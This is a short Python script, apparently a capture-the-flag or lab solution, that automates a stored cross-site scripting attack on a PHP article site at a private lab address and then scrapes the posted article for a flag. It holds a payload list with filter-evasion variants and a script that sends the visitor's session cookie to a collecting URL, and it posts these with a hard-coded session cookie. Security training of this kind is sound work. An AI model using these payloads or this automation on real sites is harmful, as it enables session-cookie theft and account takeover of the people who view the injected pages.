import requests
import urllib.parse
import bs4
#上传payload

payload='''<img src=x onerror=alert(1)>
<script>alert(2)</script>
<script>window.open(\'http://192.168.56.103:8000/test.php?cookie=\'+document.cookie)</script>
<sCrIPt>alert(4)</ScripT>
<Sscriptcript>alert(5)</Sscriptcript>'''
url='http://192.168.56.103:8000/new_article.php'
headers={
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'cookie':'pma_lang=zh_CN; PHPSESSID=48d7f4ec1e96aac4e91b352e32d95b0b;',
    'content-type':'application/x-www-form-urlencoded'
}
data=f'title=111&content={urllib.parse.quote(payload)}'
response=requests.post(url=url,headers=headers,data=data)
if response.status_code != 200:
    print('web error!')
    exit()

#获取文章列表
url='http://192.168.56.103:8000/article_list.php'
response=requests.get(url=url,headers=headers)
if response.status_code != 200:
    print('web error!')
    exit()
soup=bs4.BeautifulSoup(response.text,features="html.parser")
#print(soup.text)
if '查看' not in soup.text:
    print('上传失败，文章列表为空')
    exit()
else:
    href=soup.find('table').find_all('tr')[2].find_all('td')[2].find_all('a')[0]['href']

    href='http://192.168.56.103:8000/'+href
    #查看文章找到flag
    response=requests.get(url=href,headers=headers)
    if response.status_code != 200:
        print('web error!')
        exit()
    soup=bs4.BeautifulSoup(response.text,features="html.parser")
    #print(soup.find('div').text)
    div_tag = soup.find('div')
    if div_tag:
        if div_tag.text.find("flag{") != -1:
            print(div_tag.text)
        else:
            print("XSS attack failed!")
    else:
        print("XSS attack failed!.")
